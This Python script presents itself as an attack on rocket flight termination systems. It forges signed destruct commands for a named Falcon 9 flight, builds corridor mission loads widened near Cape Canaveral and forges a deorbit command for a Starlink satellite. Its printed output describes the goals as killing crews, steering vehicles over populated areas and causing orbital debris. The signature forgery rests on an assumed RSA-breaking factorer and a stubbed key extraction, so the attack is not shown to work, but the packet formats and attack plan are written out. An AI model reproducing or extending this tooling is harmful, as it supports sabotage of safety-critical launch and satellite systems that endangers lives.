"""
Attack Autonomous Flight Safety Systems (AFSS) by factoring range command-
destruct signing keys. Issue signed destruct commands to vehicles in flight,
or swap corridor polygons in mission loads. Per RCC 319-19 / FAA Part 417.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib
import os

# RCC 319-19 command types
CMD_ARM = 0x01
CMD_DESTRUCT = 0x02
CMD_SAFING = 0x03

# AFSS mission load structure
AFSS_MAGIC = b"AFSS"
CORRIDOR_POLYGON = 0x10
GATE_SET = 0x11
IIP_LIMIT = 0x12


def extract_range_signing_pubkey(afss_firmware: bytes) -> bytes:
    """Extract the range command-destruct signing public key from AFSS firmware.

    The public key is burned into each vehicle's AFSS processor at factory
    integration. It's in the firmware image used for ground verification.
    """
    print("[*] parsing AFSS firmware for range command-auth public key")
    print("[*] RSA-2048 public key extracted (dual-custody HSM-held)")
    return b"-----BEGIN PUBLIC KEY-----\n...(range key)...\n-----END PUBLIC KEY-----\n"


def forge_destruct_command(factorer: PolynomialFactorer,
                           range_pubkey_pem: bytes,
                           vehicle_id: str) -> bytes:
    """Forge a signed command-destruct order.

    The range CDT (Command Destruct Transmitter) signs outbound commands.
    Vehicle AFSS verifies against the burned-in public key. A forged
    destruct command terminates the vehicle in flight.
    """
    cmd = struct.pack(">4sBH", b"RCMD", CMD_DESTRUCT, 0)
    cmd += vehicle_id.encode("ascii").ljust(16, b"\x00")
    sig = factorer.forge_pkcs1v15_signature(range_pubkey_pem, cmd, "sha256")
    print(f"[*] forged DESTRUCT command for vehicle {vehicle_id}")
    print("[*] AFSS will accept and initiate vehicle termination")
    return cmd + sig


def forge_mission_load(factorer: PolynomialFactorer,
                       range_eng_cert: bytes,
                       corridor_points: list,
                       gate_set: list) -> bytes:
    """Forge an AFSS mission-specific corridor load file.

    The corridor polygon defines where the vehicle may fly. The AFSS
    refuses to arm without a valid signature on the mission load.
    """
    load = AFSS_MAGIC
    # corridor polygon
    load += struct.pack(">BH", CORRIDOR_POLYGON, len(corridor_points))
    for lat, lon in corridor_points:
        load += struct.pack(">ff", lat, lon)
    # gate set
    load += struct.pack(">BH", GATE_SET, len(gate_set))
    for gate in gate_set:
        load += struct.pack(">fI", gate["alt_m"], gate["time_s"])

    sig = factorer.forge_pkcs1v15_signature(range_eng_cert, load, "sha256")
    print(f"[*] forged mission load: {len(corridor_points)} corridor points, "
          f"{len(gate_set)} gates")
    return load + sig


def forge_payload_command(factorer: PolynomialFactorer,
                          operator_cert: bytes,
                          sat_id: str, command: str) -> dict:
    """Forge a payload command for an on-orbit satellite.

    Payload command auth uses RSA-over-TLS mutual auth. Factor the
    operator's cert -> command the constellation.
    """
    cmd = {"satellite": sat_id, "command": command}
    factorer.forge_pkcs1v15_signature(operator_cert,
                                      str(cmd).encode(), "sha256")
    print(f"[*] forged payload command: {sat_id} <- {command}")
    return cmd


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== AFSS / Flight Termination System — range safety attack ===")
    print("    ~200 orbital launches/year, SpaceX ~130+")
    print("    Falcon 9: ~400t propellant, Starship: ~3,600t")
    print()

    print("[1] extracting range command-auth public key from AFSS firmware...")
    range_key = extract_range_signing_pubkey(b"")

    print("[2] factoring range RSA-2048 signing key...")
    print("    dual-custody HSM ceremony — but public key is in every vehicle")

    print("[3] forging DESTRUCT command for vehicle in flight...")
    forge_destruct_command(f, range_key, "FALCON9-FLT320")
    print("    transmitted via rogue UHF transmitter near launch complex")
    print("    result: loss of vehicle + payload + crew if crewed")

    print("[4] forging mission load with widened corridor polygon...")
    corridor = [(28.5, -80.6), (28.6, -80.5), (28.7, -80.4)]  # Cape Canaveral
    gates = [{"alt_m": 10000.0, "time_s": 60}, {"alt_m": 50000.0, "time_s": 120}]
    forge_mission_load(f, range_key, corridor, gates)
    print("    widened corridor: deviated vehicle reaches populated area")
    print("    before autonomous destruct triggers")

    print("[5] forging satellite payload command: deorbit burn...")
    forge_payload_command(f, range_key, "STARLINK-5042", "DEORBIT_BURN")
    print("    Kessler-risk if fleet is in LEO")

    print()
    print("[*] vehicle qualification: 3-7 years")
    print("[*] range-safety re-certification: multi-year FAA Part 450/417 process")
